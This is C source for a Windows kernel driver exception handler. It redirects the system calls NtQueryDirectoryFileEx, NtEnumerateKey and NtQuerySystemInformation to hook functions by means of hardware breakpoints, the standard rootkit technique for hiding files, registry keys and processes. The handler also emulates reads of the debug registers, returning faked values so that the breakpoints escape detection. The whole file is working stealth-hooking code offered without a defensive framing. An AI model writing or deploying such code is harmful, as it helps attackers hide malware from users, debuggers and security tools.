#include <ntifs.h>
#include <intrin.h>

#include "handler.h"
#include "Hook-KdTrap/HookKdTrap.h"
#include "hde/hde64.h"
#include "querydir.h"
#include "enumkey.h"
#include "querysystem.h"


uint32_t drHit = 0;

__declspec(noinline) BOOLEAN fun(int n, int m);

__declspec(noinline) BOOLEAN hooked() {
	DbgPrintEx(0, 0, "[Bot] Hook\n");
	return TRUE;
}

/*
NTSTATUS hookNtQueryDirectoryFileEx() {
	NTSTATUS result = NtQueryDirectoryFileEx();

	return result;
}
*/

BOOLEAN handler(PEXCEPTION_RECORD ExceptionRecord, PCONTEXT Context) {
	hde64s hs;
	uint64_t dr6, debugExt;
	PULONG64 reg = NULL;
	BOOLEAN result = FALSE;
	if (ExceptionRecord->ExceptionCode == STATUS_BREAKPOINT || ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
		dr6 = __readdr(6);

		if (Context->Rip == NtQueryDirectoryFileEx) {
			Context->Rip = hookNtQueryDirectoryFileEx;
			//Context->EFlags |= 1 << 16;
			result = TRUE;
		}
		if (Context->Rip == funAddr.NtEnumerateKey) {
			Context->Rip = hookNtEnumerateKey;
			result = TRUE;
		}
		if (Context->Rip == NtQuerySystemInformation) {
			Context->Rip = hookNtQuerySystemInformation;
			result = TRUE;
		}
		if (dr6 & (1 << 13)) {
			hde64_disasm((PVOID)Context->Rip, &hs);
			if (hs.opcode == 0x0f && hs.opcode2 == 0x21) {
				//Context->EFlags |= 1 << 16;
				Context->Rip += hs.len;
				if (!hs.rex_b) {
					switch (hs.modrm_rm) {
						case 0:
							reg = &Context->Rax;
							break;
						case 1:
							reg = &Context->Rcx;
							break;
						case 2:
							reg = &Context->Rdx;
							break;
						case 3:
							reg = &Context->Rbx;
							break;
						case 4:
							reg = &Context->Rsp;
							break;
						case 5:
							reg = &Context->Rbp;
							break;
						case 6:
							reg = &Context->Rsi;
							break;
						case 7:
							reg = &Context->Rdi;
							break;
					}
				} else {
					switch (hs.modrm_rm) {
						case 0:
							reg = &Context->R8;
							break;
						case 1:
							reg = &Context->R9;
							break;
						case 2:
							reg = &Context->R10;
							break;
						case 3:
							reg = &Context->R11;
							break;
						case 4:
							reg = &Context->R12;
							break;
						case 5:
							reg = &Context->R13;
							break;
						case 6:
							reg = &Context->R14;
							break;
						case 7:
							reg = &Context->R15;
							break;
					}
				}
				debugExt = __readcr4() & (1 << 3);
				dr6 &= ~(0xf | 1 << 13 | 1 << 14);
				switch (hs.modrm_reg) {
					case 0:
					case 1:
					case 2:
					case 3:
						*reg = 0;
						break;
					case 4:
						if (debugExt) {
							Context->EFlags |= 1 << 16;
						} else {
							*reg = dr6;
						}
						break;
					case 5:
						if (debugExt) {
							Context->EFlags |= 1 << 16;
						} else {
							*reg = 0x400;
						}
						break;
					case 6:
						*reg = dr6;
						break;
					case 7:
						*reg = 0x400;
						break;
				}
			} else {
				Context->Rip += hs.len;
			}
			result = TRUE;
		}
		/*
		if ((dr6 = __readdr(6)) & 0x1) {
			InterlockedExchange(&drHit, 1);

			//Context->Rip += hde64_disasm((PVOID)Context->Rip, &hs);

			Context->Rsp -= 0x8;
			//*(uint64_t*)Context->Rsp = Context->Rip;
			//Context->Rip = (uint64_t)hooked;
			*(uint64_t*)Context->Rsp = (uint64_t)hookNtQueryDirectoryFileEx;
		}
		*/
		dr6 &= ~(0xf | 1 << 13 | 1 << 14);
		__writedr(6, dr6);
		//Context->EFlags |= 1 << 16;
	}
	return result;
}